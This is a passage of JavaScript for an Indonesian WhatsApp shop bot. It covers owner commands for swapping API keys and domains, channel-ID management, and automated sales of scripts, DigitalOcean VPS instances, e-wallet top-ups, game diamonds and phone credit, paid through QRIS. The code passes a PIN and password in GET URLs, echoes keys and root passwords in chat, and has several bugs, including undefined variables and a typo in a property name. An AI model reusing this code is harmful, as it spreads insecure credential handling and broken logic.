    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`🔑 *API Key Panel Berhasil Diganti!*\n\n🔐 API Key baru: *${newApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan API Key*\n\n🔑 API Key telah diganti:\n- *API Key Baru*: ${newApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upcapikey': {
    const newCaApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newCaApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CaApiKeyBaru123`);
    }

    global.capikey = newCaApiKey; // Update CA API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`💡 *CA API Key Panel Berhasil Diganti!*\n\n🛡️ CA API Key baru: *${newCaApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan CA API Key*\n\n💡 CA API Key telah diganti:\n- *CA API Key Baru*: ${newCaApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;
    case 'updomain2': {
    const newDomain = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newDomain) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} domain.com`);
    }

    global.domainV2 = newDomain; // Update domain global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`✨ *Domain Panel Berhasil Diganti!*\n\n🌐 Domain baru: *${newDomain}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan Domain*\n\n🌐 Domain telah diganti:\n- *Domain Baru*: ${newDomain}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upapikey2': {
    const newApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} ApiKeyBaru123`);
    }

    global.apikeyV2 = newApiKey; // Update API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`🔑 *API Key Panel Berhasil Diganti!*\n\n🔐 API Key baru: *${newApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan API Key*\n\n🔑 API Key telah diganti:\n- *API Key Baru*: ${newApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

case 'upcapikey2': {
    const newCaApiKey = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newCaApiKey) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CaApiKeyBaru123`);
    }

    global.capikeyV2 = newCaApiKey; // Update CA API key global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`💡 *CA API Key Panel Berhasil Diganti!*\n\n🛡️ CA API Key baru: *${newCaApiKey}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan CA API Key*\n\n💡 CA API Key telah diganti:\n- *CA API Key Baru*: ${newCaApiKey}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
    }
    break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
if (!text) return m.reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return m.reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return m.reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break


case "buyscript": case "buysc": {
if (m.isGroup) return m.reply("Pembelian script hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Script Bot',
          sections: [
            {
              title: 'List Script Bot WhatsApp',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Simple Botz V6', 
                  description: "Rp35.000", 
                  id: '.buysc 1'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Script Bot Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Simple Bot V5"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Script Simple Bot V6"  
    } else if (tek == "3") {
    Obj.file = "./source/media/script3.zip"
    Obj.harga = "50000"
    Obj.namaSc = "Web Rest API"  
    } else return
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "buyvps": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

if (!text) return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram Server Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16 & Cpu 4', 
                  description: "Rp55.000", 
                  id: '.buyvps 4'
                },
                {
                  title: 'Ram 2 & Cpu 1', 
                  description: "Rp25.000", 
                  id: '.buyvps 1'
                },
                {
                  title: 'Ram 4 & Cpu 2', 
                  description: "Rp35.000", 
                  id: '.buyvps 2'
                },
                {
                  title: 'Ram 8 & Cpu 4', 
                  description: "Rp45.000", 
                  id: '.buyvps 3'
                }                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.images = "s-1vcpu-2gb"
    Obj.harga = "25000"
    } else if (tek == "2") {
    Obj.images = "s-2vcpu-4gb"
    Obj.harga = "35000"
    } else if (tek == "3") {
    Obj.imagess = "s-4vcpu-8gb"
    Obj.harga = "45000"
    } else if (tek == "4") {
    Obj.images = "s-4vcpu-16gb"
    Obj.harga = "55000"
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupsaldo": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return m.reply(example("085XXX"))
if (!args[0].startsWith("08")) return m.reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Top Up Saldo GO-JEK/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupsaldo ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Nominal Topup Saldo',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Saldo\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "ZarR Store" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "topupdiamond": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0] || !args[0].split("|")) return m.reply(example("id|serverid"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].split("|")[0]
let serverid = args[0].split("|")[1]
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /TPG Stumble Guys/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupdiamond ${nodana}|${serverid} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Topup Diamond',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Diamond\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.id = args[0].split("|")[0]
Obj.serverid = args[0].split("|")[1]
Obj.nodana = Obj.id + Obj.serverid
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.jumlah)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.imageqris.url}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
keterangan: Obj.nominal, 
chat: m.sender,
idDeposit: get.data.result.idtransaksi, 
amount: get.data.result.jumlah.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://restapi-v2.simplebot.my.id/orderkuota/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "ZarStore" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "isipulsa": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return m.reply(example("085XXX"))
if (!args[0].startsWith("08")) return m.reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
